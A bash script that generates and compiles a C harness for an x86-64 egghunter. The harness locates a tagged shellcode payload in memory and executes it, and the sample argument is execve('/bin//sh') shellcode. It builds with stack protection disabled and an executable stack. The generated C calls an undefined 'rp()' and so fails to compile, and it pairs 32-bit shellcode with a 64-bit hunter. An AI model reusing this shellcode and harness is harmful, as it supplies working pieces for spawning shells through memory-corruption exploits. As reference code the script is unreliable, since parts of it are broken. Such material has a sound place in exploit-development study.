# Ex: ./compile.sh ABCD "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"

echo '######### NASM #########'
echo '[+] Customizing Tag: '$1 # $1 Tag like: ABCD
tag=`echo -n $1 | xxd -ps | sed 's/[[:xdigit:]]\{2\}/\\\x&/g'`
echo '[+] Done!'

echo '[+] Customizing Shellcode: '$2 # $2 Shellcode: \x00\x01..
shellcode=$2
echo '[+] Done!'

echo '[+] Assemble shellcode C ...'

echo "#include<stdio.h>" >shellcode.c
echo "#include<string.h>" >>shellcode.c
echo "#define EGG \"$tag\"" >>shellcode.c
echo "unsigned char egghunter[] = \"\x48\x8d\x05\x18\x00\x00\x00\x48\xff\xc0\x67\x81\x38\"" >>shellcode.c
echo "                            EGG" >>shellcode.c
echo "                            \"\x75\xf4\x67\x81\x78\x04\"" >>shellcode.c
echo "                            EGG" >>shellcode.c
echo "                            \"\x75\xea\x48\x83\xc0\x08\xff\xe0\";" >>shellcode.c
echo "unsigned char shellcode[] = EGG" >>shellcode.c
echo "                            EGG" >>shellcode.c
echo "                            \"$shellcode\";" >>shellcode.c
echo "int main (int argc, char** argv) {" >>shellcode.c
echo "    printf(\"Shellcode Length: %d\\n\", (int) strlen(shellcode));" >>shellcode.c
echo "    printf(\"Egghunter Length: %d\\n\", (int) strlen(egghunter));" >>shellcode.c
echo "    int (*p)() = (int(*)())egghunter;" >>shellcode.c
echo "    rp();" >>shellcode.c
echo "}" >>shellcode.c

echo '[+] Done!'

echo '[+] Assemble shellcode.c ...'
gcc -fno-stack-protector -z execstack shellcode.c -o shellcode